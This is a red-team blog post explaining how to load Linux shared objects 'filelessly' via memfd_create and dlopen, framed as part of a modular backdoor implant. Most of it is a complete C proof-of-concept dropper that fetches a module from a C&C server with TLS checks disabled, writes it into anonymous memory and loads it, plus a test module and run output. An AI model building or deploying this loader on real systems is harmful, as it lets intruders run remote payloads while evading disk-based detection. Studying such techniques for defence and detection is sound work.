---
layout: post
title: Loading "fileless" Shared Objects (memfd_create + dlopen)
date: 2018-02-02 12:00:00
categories: posts
en: true
description: An example of how to drop modules on a target using the syscall  memfd_create
keywords: "memfd_create, __NR_memfd_create, dropper, downloader, redteam, pentest"
authors:
    - X-C3LL
---

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In our exercises as Red Team we always try to keep our tracks at minimum. The deployment of tools and implants is mandatory when we earn access to a system, but we need to avoid to drop unnecesary files in the machine. In other words: it is far better if you can load and run your tools from memory without touch disk.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
There are pretty good articles about how to map a file to memory and then execute it (or, in the case of a shared object, load it). In this post we will just show a simple example using a syscall "recently" added. This very same topic was explained in this cool post ([Super-Stealthy Droppers](https://0x00sec.org/t/super-stealthy-droppers/3715)) by 0x00Sec.

## Memfd_create Syscall

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The syscall that we are using to do the dirty job is [memfd_create](http://man7.org/linux/man-pages/man2/memfd_create.2.html). This syscall provide an easy way to get a file descriptor for anonymous memory without requiring a local tmpfs mount-point. In words of the [developers](https://dvdhrm.wordpress.com/2014/06/10/memfd_create2/):



>"memfd_create does not require a local mount-point. It can create objects that are not associated with any filesystem and can never be linked into a filesystem. The backing memory is anonymous memory as if malloc(3) had returned a file-descriptor instead of a pointer. __Note that even shm_open(3) requires /dev/shm to be a tmpfs-mount.__"

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Memfd_create  was introduced in kernel 3.17, so it is a bit "recent". We can use as an alternative (far less "funky" way) what the developers indicate in the last line: for kernels < 3.17, just use shm_open instead (not so "fileless" but still being a nice trick).

 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The syntax is pretty straighforward:
```c
int memfd_create(const char *name, unsigned int flags);
```

## Loading shared objects
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As we said in the introduction, when we earn acces to a system we need to deploy tools and implants. In the case of implants -and depending on the scenary- a good idea is to keep just a minimum skeleton as persistence. This minimal skeleton it is just the persistence itself and a mechanism to reach the C&C and download different modules to memory. In this way we have a modular backdoor that loads dynamically every portion of code needed (for example a module to scrap memory, another to parasite processes,
port-scanner, etc..). 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In order to load dynamically code we can program a very simple plugin system that loads shared objects (.so) and register new functionalities. We can use dlopen() to this approach because it admits a file descriptor as paramater :). So here is the mix:
- Contact C&C and download a module
- Open a file descriptor to a memory region and write there the .so
- Use dlopen() with that file descriptor to load the new code
- Profit

Of course this approach is pretty "lazy", but still being a valid trick to use in our operations.

## PoC || GTFO

Here is a simple example of how it can be done

```c
/* Skeleton PoC */

#define _GNU_SOURCE


#include <curl/curl.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>



#define SHM_NAME "IceIceBaby"
#define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html


// Wrapper to call memfd_create syscall
static inline int memfd_create(const char *name, unsigned int flags) {
	return syscall(__NR_memfd_create, name, flags);
}

// Detect if kernel is < or => than 3.17
// Ugly as hell, probably I was drunk when I coded it
int kernel_version() {
	struct utsname buffer;
	uname(&buffer);
	
	char *token;
	char *separator = ".";
	
	token = strtok(buffer.release, separator);
	if (atoi(token) < 3) {
		return 0;
	}
	else if (atoi(token) > 3){
		return 1;
	}

	token = strtok(NULL, separator);
	if (atoi(token) < 17) {
		return 0;
	}
	else {
		return 1;
	}
}


// Returns a file descriptor where we can write our shared object
int open_ramfs(void) {
	int shm_fd;

	//If we have a kernel < 3.17
	// We need to use the less fancy way
	if (kernel_version() == 0) {
		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (shm_fd < 0) { //Something went wrong :(
			fprintf(stderr, "[-] Could not open file descriptor\n");
			exit(-1);
		}
	}
	// If we have a kernel >= 3.17
	// We can use the funky style
	else {
		shm_fd = memfd_create(SHM_NAME, 1);
		if (shm_fd < 0) { //Something went wrong :(
			fprintf(stderr, "[- Could not open file descriptor\n");
			exit(-1);
		}
	}
	return shm_fd;
}

// Callback to write the shared object
size_t write_data (void *ptr, size_t size, size_t nmemb, int shm_fd) {
	if (write(shm_fd, ptr, nmemb) < 0) {
		fprintf(stderr, "[-] Could not write file :'(\n");
		close(shm_fd);
		exit(-1);
	}
	printf("[+] File written!\n");
}

// Download our share object from a C&C via HTTPs
int download_to_RAM(char *download) { 
	CURL *curl;
	CURLcode res;
	int shm_fd;

	shm_fd = open_ramfs(); // Give me a file descriptor to memory
	printf("[+] File Descriptor Shared Memory created!\n");
	
	// We use cURL to download the file
	// It's easy to use and we avoid to write unnecesary code
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, download);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Too lazy to search for one");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, shm_fd); //Args for our callback
		
		// Do the HTTPs request!
		res = curl_easy_perform(curl);
		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
			fprintf(stderr, "[-] cURL failed: %s\n", curl_easy_strerror(res));
			close(shm_fd);
			exit(-1);
		}
		curl_easy_cleanup(curl);
		return shm_fd;
	}
}

// Load the shared object
void load_so(int shm_fd) {
	char path[1024];
	void *handle;

	printf("[+] Trying to load Shared Object!\n");
	if (kernel_version() == 1) { //Funky way
		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
	} else { // Not funky way :(
		close(shm_fd);
		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	}
	handle = dlopen(path, RTLD_LAZY);
	if (!handle) {
		fprintf(stderr,"[-] Dlopen failed with error: %s\n", dlerror());
	}
}

int main (int argc, char **argv) {
	char *url = "https://localhost:4443/module1.so";
	int fd;

	printf("[+] Trying to reach C&C & start download...\n");
	fd = download_to_RAM(url);
	load_so(fd);
	exit(0);
}
```

Just to test it we can use something like:

```c
/* Shared Library Test */

#include <stdio.h>

void __attribute__ ((constructor)) alert_init(void);

void alert_init(void) {
    fprintf(stderr,"[+] Module was loaded correctly\n");
}
```
```
$ ./poc
[+] Trying to reach C&C & start download...
[+] File Descriptor Shared Memory created!
[+] File written!
[+] Trying to load Shared Object!
[+] Module was loaded correctly
```

## Final words

I hope this trick can be useful for you. Maybe I made some typos or minor errors, feel free to ping me at twitter [@TheXC3LL](https://twitter.com/TheXC3LL).

Byt3z! 

